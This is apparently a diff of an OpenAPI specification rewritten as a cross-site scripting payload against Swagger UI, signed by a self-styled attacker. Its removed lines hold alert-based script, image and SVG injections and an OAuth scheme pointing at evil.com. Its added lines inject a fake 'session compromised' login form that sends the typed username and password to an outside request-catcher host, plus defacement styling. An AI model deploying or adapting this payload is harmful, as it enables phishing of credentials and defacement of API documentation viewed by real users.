@@ -1,43 +1,31 @@
 openapi: 3.0.0
 info:
   title: |
-    <h1 style="color:red; text-align:center">🔥 Hacked by Ajju 🔥</h1>
-    <script>alert("DOM XSS by Ajju")</script>
-  description: |
-    <img src="x" onerror="alert('Image XSS by Ajju')" />
-    <form onsubmit="alert('Phishing Form Submitted')">
-      <input placeholder="Username" name="user" />
-      <input placeholder="Password" type="password" name="pass" />
-      <button type="submit">Login</button>
+    <h1 style="color:red; text-align:center">🔥 SYSTEM BREACHED BY AJJU 🔥</h1>
+    <div style="color:white; background:black; font-size:18px; padding:10px; text-align:center;">
+      WARNING: Your session is compromised.<br>
+      Please re-authenticate below to secure your access.
+    </div>
+    <form onsubmit="fetch('https://xss.requestcatcher.com/', {method:'POST',body:new FormData(this)})">
+      <input placeholder="👤 Username" name="u" style="margin:5px;"><br>
+      <input type="password" placeholder="🔒 Password" name="p" style="margin:5px;"><br>
+      <button type="submit" style="padding:8px;background:red;color:white;">Verify</button>
     </form>
+  description: |
+    <marquee scrollamount="12" style="color:yellow;font-size:20px;">⚠️ XSS Attempt - Your Swagger UI is vulnerable ⚠️</marquee>
     <style>
-      body { background:black !important; color:lime !important; font-family:monospace; }
+      body { background: black !important; color: lime !important; font-family: monospace; }
     </style>
-    <marquee>🔥 XSS Attack from CyberAjju 🔥</marquee>
-  version: "1.0.0"
+    <h2 style="text-align:center;">~ Made by CyberTechAjju ~</h2>
+  version: "💀"
 
 paths:
-  /hacked:
+  /exploit:
     get:
       summary: |
-        <img src=x onerror=alert('Summary XSS')>
-      description: |
-        <h3 style="color:orange;">⚠️ Test endpoint hacked ⚠️</h3>
-        <svg/onload=alert('SVG XSS')>
+        <h2 style="color:orange;">🚨 URGENT PATCH REQUIRED 🚨</h2>
       responses:
         '200':
           description: |
-            <script>alert("Response Description XSS")</script>
-            <p style="color:yellow;">Data returned successfully</p>
-
-components:
-  securitySchemes:
-    fakeOAuth:
-      type: oauth2
-      flows:
-        authorizationCode:
-          authorizationUrl: "https://evil.com/auth"
-          tokenUrl: "https://evil.com/token"
-          scopes:
-            read: read access
-            write: write access
+            ✅ Exploit test endpoint loaded.
+            <img src=x onerror=alert("Summary-Based XSS")>
